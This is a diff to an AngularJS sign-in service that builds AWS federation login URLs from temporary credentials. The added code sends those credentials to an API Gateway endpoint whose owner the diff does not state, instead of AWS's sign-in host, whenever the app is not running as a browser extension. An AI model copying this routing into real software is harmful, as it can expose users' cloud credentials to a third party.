@@ -191,7 +191,17 @@ locksmithServices.factory('signin', ['$q', '$http', '$location', function($q, $h
         request_parameters += "&Session=";
         request_parameters += encodeURIComponent(JSON.stringify(temp_credentials));
 
-        var request_url = "https://signin.aws.amazon.com/federation";
+        var request_url;
+        if (
+            (window.chrome && chrome.runtime && chrome.runtime.id) ||
+            (window.safari && safari.application)
+        ) {
+            // Running as Chrome/Safari Extension
+            request_url = "https://signin.aws.amazon.com/federation";
+        } else {
+            // Running in Browser
+            request_url = "https://kw25v8ctc2.execute-api.eu-central-1.amazonaws.com/federation";
+        }
         request_url += request_parameters;
 
         // startJob();
@@ -211,16 +221,12 @@ locksmithServices.factory('signin', ['$q', '$http', '$location', function($q, $h
         var request_url = "https://signin.aws.amazon.com/federation";
         request_url += request_parameters;
 
-        if (navigator.userAgent.indexOf('Chrome') > -1) {
-            if (chrome) {
-                chrome.windows.create({
-                    url: request_url,
-                    incognito: window.settings.incognito_sessions
-                });
-            } else {
-                window.location.href = request_url;
-            }
-        } else if (navigator.userAgent.indexOf("Safari") > -1) {
+        if (window.chrome && chrome.runtime && chrome.runtime.id) {
+            chrome.windows.create({
+                url: request_url,
+                incognito: window.settings.incognito_sessions
+            });
+        } else if (window.safari && safari.application) {
             var tab = safari.application.openBrowserWindow().activeTab;
             tab.url = request_url;
         } else {
